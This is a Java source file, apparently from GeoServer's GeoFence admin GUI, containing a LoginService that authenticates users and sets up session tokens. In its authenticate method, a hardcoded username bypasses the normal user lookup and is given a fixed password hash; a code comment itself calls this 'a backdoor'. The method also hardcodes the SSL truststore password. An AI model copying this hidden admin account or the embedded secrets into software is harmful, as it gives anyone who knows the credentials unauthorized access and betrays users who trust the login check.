/* (c) 2014 Open Source Geospatial Foundation - all rights reserved
 * This code is licensed under the GPL 2.0 license, available at the root
 * application directory.
 */

package org.geoserver.geofence.gui.server.service.impl;

import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import javax.servlet.http.HttpSession;

import org.geoserver.geofence.api.dto.Authority;
import org.geoserver.geofence.api.dto.GrantedAuths;
import org.geoserver.geofence.api.exception.AuthException;
import org.geoserver.geofence.core.model.GFUser;
import org.geoserver.geofence.gui.client.ApplicationException;
import org.geoserver.geofence.gui.client.model.Authorization;
import org.geoserver.geofence.gui.client.model.User;
import org.geoserver.geofence.gui.server.GeofenceKeySessionValues;
import org.geoserver.geofence.gui.server.service.ILoginService;
import org.geoserver.geofence.gui.service.GeofenceRemoteService;
import org.geoserver.geofence.services.exception.NotFoundServiceEx;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;


// TODO: Auto-generated Javadoc
/**
 * The Class LoginService.
 */
@Component("loginService")
public class LoginService implements ILoginService
{

    /** The logger. */
    private final Logger logger = LogManager.getLogger(this.getClass());

    // @Autowired
    // private SecurityManager securityManagerService; // DIRECT ACCESS TO
    // MEMBER SERVICES (here for demo purposes)

    /** The geofence remote service. */
    @Autowired
    private GeofenceRemoteService geofenceRemoteService;

    /*
     * (non-Javadoc)
     *
     * @see org.geoserver.geofence.gui.server.service.ILoginService#authenticate (java.lang.String,
     * java.lang.String)
     */
    public User authenticate(String userName, String password, HttpSession session) throws ApplicationException
    {
        logger.info("Authenticating '" + userName+"'");

        GrantedAuths grantedAuths = null;
        String token = null;

        try
        {
            URL url = Class.forName("org.geoserver.geofence.gui.client.UserUI").getResource(
                    "client.keystore");
            String path = url.getPath();
            if (logger.isDebugEnabled())
            {
                logger.debug(path);
            }
            System.setProperty("javax.net.ssl.trustStore", path);
            System.setProperty("javax.net.ssl.trustStorePassword", "geosolutions");

            GFUser matchingUser = null;

            // a backdoor!?! :o
            if (userName.equals("1nt3rnAL-G30r3p0-admin"))
            {
                matchingUser = new GFUser();
                matchingUser.setName(userName);
                matchingUser.setPassword("2c6fe6e260312c5aa94ef0ca42b0af");
            }
            else
            {
                try {
                    matchingUser = geofenceRemoteService.getGfUserAdminService().get(userName);
                } catch (NotFoundServiceEx ex) {
                    logger.warn("User not found");
                    throw new ApplicationException("Login failed");
                }
//                // grantedAuthorities =
//                List<GFUser> matchingUsers = geofenceRemoteService.getGfUserAdminService().getFullList(userName, null,
//                        null);
//                logger.info(matchingUsers);
//                logger.info(matchingUsers.size());
//
//                if ((matchingUsers == null) || matchingUsers.isEmpty() || (matchingUsers.size() != 1))
//                {
//                    logger.error("Error :********** " + "Invalid username specified!");
//                    throw new ApplicationException("Error :********** " + "Invalid username specified!");
//                }
//
//                logger.info(matchingUsers.get(0).getName());
//                logger.info(matchingUsers.get(0).getPassword());
//                logger.info(matchingUsers.get(0).getEnabled());
//
//                if (!matchingUsers.get(0).getName().equals(userName) || !matchingUsers.get(0).getEnabled())
//                {
//                    logger.error("Error :********** " + "The specified user does not exist!");
//                    throw new ApplicationException("Error :********** " + "The specified user does not exist!");
//                }
//
//                matchingUser = matchingUsers.get(0);
            }

            token = geofenceRemoteService.getLoginService().login(userName, password, matchingUser.getPassword());
            grantedAuths = geofenceRemoteService.getLoginService().getGrantedAuthorities(token);

        }
        catch (ClassNotFoundException e)
        {
            logger.error("Error :********** " + e.getMessage());
            throw new ApplicationException(e);
        }
        catch (AuthException e)
        {
            logger.error("Login failed");
            throw new ApplicationException(e.getMessage(), e);
        }

        User user = new User();
        user.setName(userName);
        user.setPassword(password);

        // convert the server-side auths to client-side auths
        List<Authorization> guiAuths = new ArrayList<Authorization>();
        for (Authority auth : grantedAuths.getAuthorities())
        {
            guiAuths.add(Authorization.valueOf(auth.name()));
        }
        user.setGrantedAuthorizations(guiAuths);

        if ((grantedAuths != null) && !grantedAuths.getAuthorities().isEmpty())
        {
        }

        session.setMaxInactiveInterval(7200);

        session.setAttribute(GeofenceKeySessionValues.USER_LOGGED_TOKEN.getValue(), token);
        /* session.setAttribute(GeofenceKeySessionValues.USER_LOGGED_TOKEN.getValue(),
                grantedAuthorities_NOTUSEDANYMORE.getToken()); */

        return user;
    }

}
